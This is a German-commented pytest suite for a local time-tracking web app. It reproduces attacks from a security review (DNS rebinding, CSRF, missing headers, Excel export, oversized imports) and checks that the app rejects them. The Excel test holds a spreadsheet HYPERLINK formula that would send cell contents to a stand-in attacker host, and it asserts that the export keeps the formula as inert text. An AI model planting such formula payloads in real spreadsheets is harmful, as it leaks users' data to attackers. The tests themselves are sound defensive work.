"""Nachstellung der Angriffe aus der Sicherheitsanalyse (DNS-Rebinding, CSRF, Header, Excel)."""
import io
from datetime import datetime

import pytest

from timetrack import security
from timetrack.app import create_app
from timetrack.db import Database


@pytest.fixture
def c(tmp_path):
    e = {"TIMETRACK_DB_SQLITE": str(tmp_path / "t.db")}
    db = Database(e)
    db.init_schema()
    db.set_setting("start_date", "2026-11-01")
    return create_app(db, env=e, clock=lambda: datetime(2026, 11, 10, 9, 0)).test_client()


def state(c):
    return c.get("/api/status").get_json()["state"]


# --- Nr. 1: DNS-Rebinding -------------------------------------------------------

@pytest.mark.parametrize("host", ["rebind.evil.example", "rebind.evil.example:54321", "192.168.1.5:54321"])
def test_foreign_host_rejected(c, host):
    for path in ("/", "/api/backup", "/api/status"):
        r = c.get(path, headers={"Host": host})
        assert r.status_code == 403, (host, path)
    assert c.post("/api/toggle", json={}, headers={"Host": host}).status_code == 403
    assert state(c) == "pause"


@pytest.mark.parametrize("host", ["localhost", "localhost:54321", "127.0.0.1:54321", "[::1]:54321"])
def test_local_hosts_allowed(c, host):
    assert c.get("/api/status", headers={"Host": host}).status_code == 200


def test_allowed_hosts_config():
    assert security.allowed_hosts({}) == {"localhost", "127.0.0.1", "::1"}
    assert "0.0.0.0" not in security.allowed_hosts({"TIMETRACK_LISTEN": "0.0.0.0"})
    h = security.allowed_hosts({"TIMETRACK_LISTEN": "10.0.0.2", "TIMETRACK_ALLOWED_HOSTS": "pc.lan, [fe80::1]"})
    assert {"10.0.0.2", "pc.lan", "fe80::1"} <= h
    assert security.host_name("[::1]:54321") == "::1"
    assert security.host_name("LocalHost:1") == "localhost"


# --- Nr. 3 / 7: CSRF ---------------------------------------------------------------

@pytest.mark.parametrize("kwargs", [
    {"data": "x", "content_type": "text/plain"},                       # <form enctype=text/plain>
    {"data": {"a": "b"}},                                              # normales <form>
    {"data": b"", "content_type": "multipart/form-data; boundary=x"},  # multipart
])
def test_simple_cross_site_requests_rejected(c, kwargs):
    assert c.post("/api/toggle", **kwargs).status_code == 403
    assert c.post("/api/years/2026/holidays", **kwargs).status_code == 403
    assert state(c) == "pause"


@pytest.mark.parametrize("headers", [
    {"Origin": "https://evil.example"},
    {"Origin": "null"},
    {"Origin": "http://localhost:3000"},          # andere lokale Anwendung
    {"Sec-Fetch-Site": "cross-site"},
    {"Sec-Fetch-Site": "same-site"},
])
def test_foreign_origin_rejected_even_with_json(c, headers):
    assert c.post("/api/toggle", json={}, headers=headers).status_code == 403
    assert c.get("/api/backup", headers=headers).status_code == 403
    assert state(c) == "pause"


def test_own_browser_requests_allowed(c):
    h = {"Origin": "http://localhost", "Sec-Fetch-Site": "same-origin"}
    assert c.post("/api/toggle", json={"from": "pause"}, headers=h).get_json()["state"] == "work"
    assert c.get("/", headers={"Sec-Fetch-Site": "none"}).status_code == 200
    # Navigation von fremder Seite auf die Startseite bleibt möglich (nur API gesperrt)
    assert c.get("/", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 200


def test_cli_client_like_waytimetrack_allowed(c):
    """urllib/curl senden weder Origin noch Sec-Fetch-Site."""
    h = {"Host": "127.0.0.1:54321", "User-Agent": "Python-urllib/3.12"}
    assert c.get("/api/status", headers=h).status_code == 200
    assert c.post("/api/toggle", json={}, headers=h).get_json()["state"] == "work"


# --- Nr. 4: Excel ----------------------------------------------------------------

def test_excel_comments_are_plain_text(c):
    openpyxl = pytest.importorskip("openpyxl")
    formula = '=HYPERLINK("https://evil.example/?d="&A1,"Details")'
    c.put("/api/day/2026-11-03/note", json={"note": formula})
    c.put("/api/day/2026-11-04/note", json={"note": "https://evil.example"})
    c.put("/api/day/2026-11-05/note", json={"note": "0042"})
    ws = openpyxl.load_workbook(io.BytesIO(c.get("/api/export/excel").data))["November 2026"]
    cells = {ws.cell(r, 1).value.day: ws.cell(r, 6) for r in range(10, 16)}
    assert cells[3].data_type == "s" and cells[3].value == formula
    assert cells[4].data_type == "s" and cells[4].hyperlink is None
    assert cells[5].value == "0042"


# --- Nr. 6: Header -----------------------------------------------------------------

def test_security_headers(c):
    for path in ("/", "/static/app.js", "/api/status"):
        h = c.get(path).headers
        assert "frame-ancestors 'none'" in h["Content-Security-Policy"]
        assert "script-src 'self'" in h["Content-Security-Policy"]
        assert h["X-Frame-Options"] == "DENY"
        assert h["X-Content-Type-Options"] == "nosniff"
        assert h["Referrer-Policy"] == "no-referrer"


def test_no_inline_code_for_csp():
    """Die CSP verbietet Inline-Skripte und -Styles; die Oberfläche darf keine benutzen."""
    import pathlib
    import re
    static = pathlib.Path(__file__).parent.parent / "timetrack" / "static"
    html = (static / "index.html").read_text()
    js = (static / "app.js").read_text()
    assert not re.search(r"<script(?![^>]*\bsrc=)", html)
    assert not re.search(r"\sstyle=|\son[a-z]+=", html + js)


# --- Nr. 8: Größen -----------------------------------------------------------------

def test_request_size_limit(c):
    r = c.post("/api/backup", data=b"[" + b" " * (security.MAX_REQUEST_BYTES + 1) + b"]",
               content_type="application/json")
    assert r.status_code == 413


@pytest.mark.parametrize("table,row", [
    ("day_notes", {"day": "2026-11-03", "note": "x" * 2001}),
    ("day_marks", {"day": "2026-11-03", "kind": "NF", "note": "x" * 101, "auto": 0}),
    ("day_notes", {"day": "2026-11-03", "note": {"html": 1}}),
])
def test_import_rejects_oversized_or_wrong_types(c, table, row):
    backup = c.get("/api/backup").get_json()
    backup[table] = [row]
    r = c.post("/api/backup", json=backup)
    assert r.status_code == 400
